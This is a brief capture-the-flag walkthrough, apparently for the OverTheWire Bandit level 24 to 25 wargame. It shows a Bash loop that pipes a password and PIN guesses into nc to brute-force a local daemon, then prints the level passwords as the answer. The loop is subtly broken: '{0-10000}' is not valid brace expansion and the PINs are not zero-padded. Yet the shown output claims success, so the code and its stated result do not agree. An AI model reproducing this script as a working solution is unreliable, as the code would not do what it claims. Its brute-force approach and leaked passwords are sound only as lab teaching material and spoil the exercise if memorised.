A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

```
bandit24@melinda:~$ mkdir /tmp/jhalon
bandit24@melinda:~$ cd /tmp/jhalon
bandit24@melinda:/tmp/jhalon$ nano
```

We will go ahead and write a new Bash Script to Brute Force the PIN while attempting a connection.

```
#!/bin/bash
passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for a in {0-10000}
do
    echo $passwd' '$a | nc localhost 30002 >> result &
done
```

Save the script as `script.sh`, and go back to console to run the script.

```
bandit24@melinda:/tmp/jhalon$ chmod 755 script.sh
bandit24@melinda:/tmp/jhalon$ ./script.sh
bandit24@melinda:/tmp/jhalon$ sort result | uniq -u

Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```
